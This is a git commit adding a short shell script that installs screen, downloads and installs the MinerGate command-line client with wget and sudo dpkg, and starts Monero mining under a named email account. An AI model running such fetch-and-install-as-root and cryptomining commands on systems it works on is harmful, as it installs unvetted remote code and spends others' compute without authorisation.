f5441dae0f31f5fe561b13fb3f963cf6e089cb26
mjahanshiri81 <84614243+mjahanshiri81@users.noreply.github.com>
2021-05-22 11:06:22 +0430

    Create kotopi2223.sh

---
+++ kotopi2223.sh
@@ -0,0 +1,5 @@
+# kotopi2223
+sudo apt update
+sudo apt install screen -y
+wget https://minergate.com/download/deb-cli -O minergate-cli.deb && sudo dpkg -i minergate-cli.deb
+minergate-cli -user ssarab367@gmail.com -xmr 4
